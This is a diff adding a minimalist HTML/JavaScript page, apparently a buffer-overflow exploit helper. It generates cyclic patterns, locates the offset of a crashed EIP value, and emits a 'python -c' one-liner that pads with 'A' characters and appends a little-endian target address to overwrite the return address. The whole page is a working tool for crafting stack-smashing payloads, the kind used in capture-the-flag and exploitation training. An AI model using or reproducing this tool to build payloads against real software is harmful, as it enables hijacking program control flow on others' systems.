@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title></title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      background: #000;
+      color: #fff;
+      font: 14px/1.4 ui-monospace, Menlo, Consolas, monospace;
+    }
+    main {
+      max-width: 720px;
+      margin: 0 auto;
+      padding: 24px 16px 48px;
+      display: grid;
+      gap: 10px;
+    }
+    input, button, .out {
+      background: #000;
+      color: #fff;
+      border: 1px solid #fff;
+      border-radius: 0;
+      padding: 8px 10px;
+      font: inherit;
+    }
+    input { width: 100%; }
+    button { cursor: pointer; align-self: end; }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      color: #fff;
+    }
+    .row { display: grid; grid-template-columns: 1fr auto auto; gap: 10px; align-items: end; }
+    .row2 { display: grid; grid-template-columns: 1fr 1fr auto; gap: 10px; align-items: end; }
+    .out { min-height: 64px; white-space: pre-wrap; word-break: break-all; }
+    .hidden { display: none; }
+    button.flash {
+      color: #00ff00;
+      border-color: #00ff00;
+    }
+    @media (max-width: 640px) {
+      .row, .row2 { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <div class="row">
+      <div>
+        <label for="size">input</label>
+        <input id="size" value="100" />
+      </div>
+      <button type="button" id="btnPattern">generate</button>
+      <button type="button" id="btnReset">reset</button>
+    </div>
+    <div class="hidden" id="step1out">
+      <div class="out" id="patternOut"></div>
+      <button type="button" id="btnCopyOut">copy</button>
+    </div>
+
+    <div class="hidden" id="step2">
+      <div class="row2">
+        <div>
+          <label for="eip">eip register</label>
+          <input id="eip" placeholder="0xXXXXXXXX" />
+        </div>
+        <div>
+          <label for="addr">target addr</label>
+          <input id="addr" placeholder="0xXXXXXXXX" />
+        </div>
+        <button type="button" id="btnExploit">exploit</button>
+      </div>
+    </div>
+
+    <div class="hidden" id="step3">
+      <div class="out" id="payloadOut"></div>
+      <button type="button" id="btnCopy">copy</button>
+    </div>
+  </main>
+  <script>
+    const $ = (id) => document.getElementById(id);
+
+    function cyclic(size) {
+      let out = "";
+      for (let A = 65; A <= 90 && out.length < size; A++) {
+        for (let a = 97; a <= 122 && out.length < size; a++) {
+          for (let d = 0; d <= 9 && out.length < size; d++) {
+            out += String.fromCharCode(A) + String.fromCharCode(a) + String(d);
+          }
+        }
+      }
+      return out.slice(0, size);
+    }
+
+    function parseHex(str) {
+      const clean = String(str || "").trim().replace(/^0x/i, "");
+      if (!/^[0-9a-fA-F]+$/.test(clean)) return null;
+      return parseInt(clean, 16);
+    }
+
+    function packLE(value) {
+      return [
+        value & 0xff,
+        (value >>> 8) & 0xff,
+        (value >>> 16) & 0xff,
+        (value >>> 24) & 0xff
+      ];
+    }
+
+    function escapes(bytes) {
+      return bytes.map((b) => "\\x" + b.toString(16).padStart(2, "0")).join("");
+    }
+
+    function isAddress(raw) {
+      const s = String(raw || "").trim();
+      if (/^0x[0-9a-fA-F]+$/i.test(s)) return true;
+      if (/^[0-9a-fA-F]*[a-fA-F][0-9a-fA-F]*$/.test(s) && s.length >= 6) return true;
+      if (/^[0-9a-fA-F]{8,}$/.test(s)) return true;
+      return false;
+    }
+
+    $("btnPattern").onclick = () => {
+      const raw = $("size").value.trim();
+      $("step3").classList.add("hidden");
+      if (isAddress(raw)) {
+        const val = parseHex(raw);
+        if (val === null) {
+          $("patternOut").textContent = "invalid";
+          $("step1out").classList.remove("hidden");
+          $("step2").classList.add("hidden");
+          return;
+        }
+        $("patternOut").textContent = escapes(packLE(val));
+        $("step1out").classList.remove("hidden");
+        $("step2").classList.add("hidden");
+        return;
+      }
+      const n = parseInt(raw, 10);
+      if (!Number.isFinite(n) || n < 4) {
+        $("patternOut").textContent = "invalid";
+        $("step1out").classList.remove("hidden");
+        $("step2").classList.add("hidden");
+        return;
+      }
+      $("patternOut").textContent = cyclic(n);
+      $("step1out").classList.remove("hidden");
+      $("step2").classList.remove("hidden");
+    };
+
+    $("btnExploit").onclick = () => {
+      const eip = parseHex($("eip").value);
+      const addr = parseHex($("addr").value);
+      const pattern = $("patternOut").textContent;
+      if (eip === null || addr === null || !pattern) {
+        $("payloadOut").textContent = "invalid";
+        $("step3").classList.remove("hidden");
+        return;
+      }
+      const offset = pattern.indexOf(String.fromCharCode(...packLE(eip)));
+      if (offset < 0) {
+        $("payloadOut").textContent = "not found";
+        $("step3").classList.remove("hidden");
+        return;
+      }
+      $("payloadOut").textContent =
+        "python -c 'print\"A\"*" + offset + "+\"" + escapes(packLE(addr)) + "\"'";
+      $("step3").classList.remove("hidden");
+    };
+
+    $("btnReset").onclick = () => {
+      $("size").value = "100";
+      $("patternOut").textContent = "";
+      $("step1out").classList.add("hidden");
+      $("btnCopyOut").classList.remove("flash");
+      $("btnCopy").classList.remove("flash");
+      $("eip").value = "";
+      $("addr").value = "";
+      $("payloadOut").textContent = "";
+      $("step2").classList.add("hidden");
+      $("step3").classList.add("hidden");
+      $("btnCopy").textContent = "copy";
+    };
+
+    async function copyFrom(id, btn) {
+      const text = $(id).textContent;
+      if (!text) return;
+      try {
+        await navigator.clipboard.writeText(text);
+        btn.classList.add("flash");
+        clearTimeout(btn._flash);
+        btn._flash = setTimeout(() => btn.classList.remove("flash"), 1000);
+      } catch (_) {}
+    }
+
+    $("btnCopyOut").onclick = () => copyFrom("patternOut", $("btnCopyOut"));
+    $("btnCopy").onclick = () => copyFrom("payloadOut", $("btnCopy"));
+  </script>
+</body>
+</html>
